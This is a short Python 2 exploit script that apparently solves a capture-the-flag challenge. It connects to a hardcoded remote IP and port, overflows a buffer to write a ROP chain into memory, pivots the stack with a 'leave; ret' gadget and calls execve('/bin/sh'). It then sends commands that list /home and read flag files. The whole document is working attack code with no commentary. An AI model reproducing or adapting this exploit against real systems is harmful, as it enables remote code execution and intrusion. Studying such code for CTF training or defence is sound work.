#!/usr/bin/python

import sys
import struct
import socket
import time

s = socket.create_connection(('52.68.53.28', 56746), 5)

w = lambda(x): s.send(x)
p = lambda(x): struct.pack('<Q', x)

def write_bytes(dest, data):
    payload =  'A'*16
    payload += struct.pack('<Q', dest + 0x10)
    payload += struct.pack('<Q', 0x400505)
    payload += data.ljust(16, '\x00')
    payload += struct.pack('<Q', 0x600f00)
    payload += struct.pack('<Q', 0x400505)
    w(payload)

def set_rsp(dest):
    payload = 'A'*16
    payload += struct.pack('<Q', dest - 0x8)
    payload += struct.pack('<Q', 0x400520)      # leave; ret
    w(payload)

rop_addr = 0x600910

rop  = p(0x40058a)
rop += p(0x0)
rop += p(0x1)
rop += p(0x6008e8)
rop += p(0x3b)
rop += p(0x6008e8 - 0x3a)
rop += p(0x0)
rop += p(0x400570)
rop += p(0x41414141)

rop += p(0x0)
rop += p(0x1)
rop += p(0x6008e8)
rop += p(0x600e00)
rop += p(0x600e00)
rop += p(0x6008e8 - 0x3a)
rop += p(0x400570)


for x in xrange(0, len(rop), 16):
    write_bytes(rop_addr + x, rop[x:x+16])
set_rsp(rop_addr)

w('/bin/sh'.ljust(0x3a, '\x00') + '\xee')
time.sleep(1)
w('ls /home; ls /home/*; cat /home/readable/flag; cat /flag;\n')
time.sleep(1)
print s.recv(1000)
